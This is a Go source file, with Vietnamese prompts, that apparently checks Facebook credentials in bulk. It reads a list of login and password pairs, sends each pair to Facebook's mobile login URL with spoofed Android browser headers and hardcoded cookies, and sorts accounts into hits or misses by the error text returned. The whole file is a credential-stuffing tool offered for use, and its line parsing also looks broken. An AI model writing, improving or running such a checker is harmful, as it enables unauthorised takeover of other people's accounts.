package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

func getcookies(mail string, pass string) (string, error) {
	email := strings.Split(mail, "@")[0]
	url := "https://mbasic.facebook.com/login/?email=" + email + "&li=" + pass + "&e=1348028&shbl=1&ref=dbl&wtsid=rdr_081zDENLOAfGJR4BI&refsrc=deprecated&_rdr"
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("error: %v", err)
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error: %v", err)
	}
	defer resp.Body.Close()
	cookies := resp.Cookies()
	var datr string
	for _, cookie := range cookies {
		if cookie.Name == "datr" {
			datr = cookie.Value
			break
		}
	}
	return datr, nil
}

func main() {
	var filename string
	fmt.Println("nhập file chứa list mail: ")
	_, err := fmt.Scan(&filename)
	if err != nil {
		log.Fatal("Error: ", err)
	}

	file, err := os.Open(filename)
	if err != nil {
		log.Fatal("Error: ", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, "@")
		if len(parts) < 2 {
			continue
		}
		mail := parts[0]
		pass := parts[1]

		datrcookie, err := getcookies(mail, pass)
		if err != nil {
			fmt.Println("Error: ", err)
			continue
		}

		client := &http.Client{}
		req, err := http.NewRequest("GET", "https://mbasic.facebook.com/login/?email="+mail+"&li="+pass+"&e=1348028&shbl=1&ref=dbl&wtsid=rdr_081zDENLOAfGJR4BI&refsrc=deprecated&_rdr", nil)
		if err != nil {
			log.Fatal(err)
		}

		req.Header.Set("authority", "mbasic.facebook.com")
		req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		req.Header.Set("accept-language", "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5")
		req.Header.Set("cache-control", "max-age=0")
		req.Header.Set("cookie", "datr="+datrcookie+"; sb=aPryZP0h2K9P_lPONLah1Ilb; ps_n=1; ps_l=1; vpd=v1%3B664x360x2; m_pixel_ratio=2; wd=360x664; fr=0fCJ0Dgt3LO8qls8z.AWXMR5F59NLsRK3ug-zKN7YneaE.Bk8vpo..AAA.0.0.BmlFzE.AWVcg8IkTIs")
		req.Header.Set("dpr", "2")
		req.Header.Set("referer", "https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1")
		req.Header.Set("sec-ch-prefers-color-scheme", "dark")
		req.Header.Set("sec-ch-ua", `"Not-A.Brand";v="99", "Chromium";v="124"`)
		req.Header.Set("sec-ch-ua-full-version-list", `"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"`)
		req.Header.Set("sec-ch-ua-mobile", "?1")
		req.Header.Set("sec-ch-ua-model", `"CPH2239"`)
		req.Header.Set("sec-ch-ua-platform", `"Android"`)
		req.Header.Set("sec-ch-ua-platform-version", `"11.0.0"`)
		req.Header.Set("sec-fetch-dest", "document")
		req.Header.Set("sec-fetch-mode", "navigate")
		req.Header.Set("sec-fetch-site", "same-origin")
		req.Header.Set("sec-fetch-user", "?1")
		req.Header.Set("upgrade-insecure-requests", "1")
		req.Header.Set("user-agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")
		req.Header.Set("viewport-width", "980")

		resp, err := client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()

		bodyText, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		//fmt.Printf("%s\n", bodyText)
		if strings.Contains(string(bodyText), "Số di động hoặc email bạn nhập không khớp với bất kỳ tài khoản nào.") {
			//process if email bad
		} else {
			//process if email hits
		}
	}
}
